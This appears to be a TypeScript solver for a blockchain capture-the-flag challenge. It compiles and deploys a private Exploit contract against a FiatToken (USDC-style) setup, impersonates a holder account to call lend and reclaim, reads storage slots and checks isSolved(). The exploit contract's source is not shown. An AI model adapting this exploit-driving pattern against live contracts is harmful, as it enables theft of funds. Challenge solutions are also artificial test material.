import { BADNAME } from 'dns';
import { SolCompiler } from '../../../../lib/compiler';
import { Sender } from '../../../../lib/sender';
import setting from '../setting.json';
import BN from 'bn.js';
import Web3 from 'web3';
import { getItemSlotOfMappingByKey, hexToBuffer } from '../../../../lib/helper';

const abi = require('ethereumjs-abi');
const web3 = new Web3();

const usdcAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';

const input = (findFileContent: any): any => {
    return {
        language: 'Solidity',
        sources: {
            //  public/<FILE_NAME>.sol
            'public/Setup.sol': {
                content: findFileContent('public/Setup.sol')
            },
            'public/FiatTokenV2.sol': {
                content: findFileContent('public/FiatTokenV2.sol')
            },
            'public/FiatTokenV3.sol': {
                content: findFileContent('public/FiatTokenV3.sol')
            },
    
            //  private/<FILE_NAME>.sol
            'private/Exploit.sol': {
                content: findFileContent('private/Exploit.sol')
            },
        },
        settings: {
            outputSelection: {
                '*': {
                    '*': ['*']
                }
            },
            optimizer: { enabled: true }
        }
    }
}

/**
 * 
 * @param exploiter 
 * @param version 
 * @param setupAddress 
 * @param valueEth 
 * @returns true if solved, false otherwise.
 */
export const solve = async (exploiter: Sender, setupAddress: string): Promise<boolean> => {
    await exploiter.nonce();
    const compiler = new SolCompiler(setting.solc.version, setting.problem.name);
    const {success, output} = await compiler.compile(input);
    if(!success){
        console.log('fail compilation');
        return false;
    }
    const bytecode = output['contracts']['private/Exploit.sol']['Exploit'].evm.bytecode.object;
    const exploitContractAddress = await exploiter.deployContract(bytecode+'000000000000000000000000'+setupAddress.slice(2));
    console.log('private/Exploit.sol', exploitContractAddress);

    // for(let i=0;i<23;i++){
    //     const data = await exploiter.getStorageAt('0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', new BN(i));
    //     console.log(i,':',data);
    // }
    // {
    //     const implSlot = web3.utils.hexToNumberString('0x7050c9e0f4ca769c69bd3a8ef740bc37934f8e2c036e5a723fd8ee048ed3f8c3');
    //     const data = await exploiter.getStorageAt('0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', new BN(implSlot));
    //     console.log('impl:',data);
    // }
    // {
    //     const slot = getItemSlotOfMappingByKey(hexToBuffer('0x39aa39c021dfbae8fac545936693ac917d5e7563'), new BN(9));
    //     const data = await exploiter.getStorageAt('0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', new BN(slot));
    //     console.log('balance:',data);
    // }
    
    console.log('debug start');
    const asSender = '0x6262998Ced04146fA42253a5C0AF90CA02dfd2A3';
    {
        const data = abi.simpleEncode('balanceOf(address)', asSender);
        const res = await exploiter.viewContract(usdcAddress, data);
        console.log(res);
    }
    {
        //  lend
        const data = abi.simpleEncode('lend(address,uint)', exploitContractAddress, new BN(123));
        const receipt = await exploiter.callContractFromUnknown(asSender, usdcAddress, data);
        console.log(receipt);
    }
    {
        const slot1 = getItemSlotOfMappingByKey(hexToBuffer(asSender), new BN(21));
        const slot2 = getItemSlotOfMappingByKey(hexToBuffer(exploitContractAddress), slot1)
        const data = await exploiter.getStorageAt(usdcAddress, slot2);
        console.log('loan:',data);
    }
    {
        //  reclaim
        const data = abi.simpleEncode('reclaim(address,uint)', exploitContractAddress, new BN(123));
        const receipt = await exploiter.callContractFromUnknown(asSender, usdcAddress, data);
        console.log(receipt);
    }
    {
        const slot1 = getItemSlotOfMappingByKey(hexToBuffer(asSender), new BN(21));
        const slot2 = getItemSlotOfMappingByKey(hexToBuffer(exploitContractAddress), slot1)
        const data = await exploiter.getStorageAt(usdcAddress, slot2);
        console.log('loan:',data);
    }

    const data = abi.simpleEncode('isSolved()');
    const res = await exploiter.viewContract(setupAddress, data)
    return res === '0x0000000000000000000000000000000000000000000000000000000000000001';
}